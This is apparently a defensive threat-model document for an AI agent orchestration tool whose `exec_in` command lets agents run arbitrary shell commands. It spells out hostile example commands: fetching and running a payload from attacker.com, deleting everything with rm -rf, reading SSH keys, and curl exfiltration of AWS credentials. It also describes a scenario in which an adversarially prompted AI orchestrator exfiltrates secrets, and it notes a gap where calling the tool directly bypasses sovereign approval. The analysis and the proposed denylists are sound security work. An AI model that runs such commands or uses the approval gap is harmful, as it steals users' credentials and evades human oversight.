# Command Execution Risks

## Summary

Claude King's `exec_in` MCP tool and PTY session layer allow AI agents to run arbitrary shell commands inside vassal terminals. This is an intentional and necessary feature, but it creates a direct command injection surface that has no allowlist, denylist, or sandboxing at the King layer.

## Scope

- `exec_in` MCP tool (PTY-based command execution)
- Delegation model (`delegate_control`)
- Guard circuit breaker enforcement

## Relevant Components

- `internal/mcp/tools.go` — `handleExecIn()`: parses vassal name and command string, looks up PTY session, calls `session.ExecCommand(command, timeout)` directly with no pre-execution filtering
- `internal/pty/session.go` — `ExecCommand()`: writes command bytes directly to PTY master
- `internal/daemon/daemon.go` — sovereign approval gate (around line 1250): when `SovereignApproval` is configured, blocks `exec_in` via daemon RPC until a Sovereign responds via `respond_approval`
- `internal/daemon/delegation_handlers.go` — `anyCircuitOpen()`: the only enforcement gate before `delegate_control`; does not gate `exec_in`
- `internal/audit/approval.go` — `ApprovalManager`: manages pending approval channels by request ID; used by the daemon RPC handler, not by the MCP tool handler directly

## Risk Description

`exec_in` passes the `command` parameter directly to the vassal's PTY session with no pre-execution filtering. Any string can be passed: `rm -rf /`, `curl attacker.com/payload | bash`, `git push --force`, `cat ~/.ssh/id_rsa`. The command executes with the same OS privileges as the user who started `king up`.

Notably, the MCP tool handler (`handleExecIn` in `internal/mcp/tools.go`) does not itself check `sovereignApproval`. The approval gate is implemented in the daemon's internal RPC handler for `exec_in` (`internal/daemon/daemon.go`), which is a separate code path from the MCP tool. When an AI model calls the MCP `exec_in` tool, the request is routed through the daemon's RPC layer where the approval check takes place.

The circuit breaker (`anyCircuitOpen`) blocks `delegate_control` when a guard detects a problem, but this does not prevent `exec_in` from running high-risk commands — those are separate code paths.

## Abuse Scenario

1. An AI model operating as a King vassal receives a crafted task that includes shell commands in its payload.
2. The orchestrating AI (King itself or another vassal) calls `exec_in(vassal="target", command="curl http://attacker/exfil?data=$(cat ~/.aws/credentials)")`.
3. The command executes. No King-layer safeguard blocks it unless sovereign approval mode is enabled.
4. The output may be returned to the model, completing the exfiltration loop.

This requires a compromised or misconfigured orchestrator, not a direct attacker. The realistic threat is AI model misbehavior under adversarial prompting, not external network access.

## Existing Safeguards

- **Sovereign approval gate** (`internal/daemon/daemon.go`): when `sovereign_approval` is configured, `exec_in` routed through the daemon RPC layer blocks on an approval channel (`ApprovalManager.Request`) until a Sovereign responds via `respond_approval`. This is a strong safeguard when enabled.
- **Guard circuit breaker** (`anyCircuitOpen` in `internal/daemon/delegation_handlers.go`): blocks `delegate_control` when a vassal's health checks fail. This prevents an unhealthy vassal from being handed new delegations.
- **Audit trail**: `exec_in` executions create an `ActionTrace` record in SQLite via `d.store.CreateActionTrace()`. Forensic review is possible after the fact.

## Gaps

- No allowlist or denylist for commands passed to `exec_in`. Any shell command is accepted.
- Sovereign approval mode is not documented as required or default — it is optional configuration. Whether it is enabled depends on user setup.
- The MCP tool handler (`handleExecIn` in `internal/mcp/tools.go`) does not itself enforce approval; it relies on the daemon RPC layer to do so. Callers invoking the MCP tool directly (not via the daemon) bypass this gate.
- The circuit breaker does not gate `exec_in` directly, only `delegate_control`.
- PTY output is captured but not scanned for secrets before being returned to the caller.

## Recommendations

1. **Document sovereign approval mode clearly** in the README and quickstart as the primary mitigation for command injection risk.
2. **Add a denylist** for highest-risk patterns (e.g. `curl.*|.*sh`, `rm -rf`, `cat.*credentials`) as a configurable option. To be detailed in `docs/secure-bash-roadmap.md` (planned).
3. **Consider gating exec_in through the circuit breaker** in addition to `delegate_control`.
4. **Scan exec_in output** for secrets using the existing `internal/security/scanner` before returning to the caller.
